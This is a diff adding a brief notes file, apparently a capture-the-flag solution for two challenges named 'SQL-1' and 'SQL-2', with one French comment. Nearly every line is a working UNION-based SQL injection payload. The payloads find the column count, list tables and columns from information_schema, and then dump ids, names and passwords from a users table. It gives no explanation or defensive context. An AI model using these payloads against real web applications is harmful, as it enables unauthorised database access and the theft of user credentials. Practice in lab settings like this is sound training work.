@@ -1,0 +1,20 @@
+#chall SQL-1
+
+' union select 0,0,0,0 #
+
+' union select 0,0,table_name,0 from information_schema.tables #
+
+' union select 0,0,column_name,0 from information_schema.columns where table_name='chall' #
+
+ ' union select id, origine, message, 0 from chall #
+
+#chall SQL-2
+
+ ' union select 0,0,table_name,0 from information_schema.tables #
+
+' union select 0,0,column_name,0 from information_schema.columns where table_name='messages' #
+-> pas dans messages mais dans users
+
+' union select id, name, password, 0 from users #
+
+
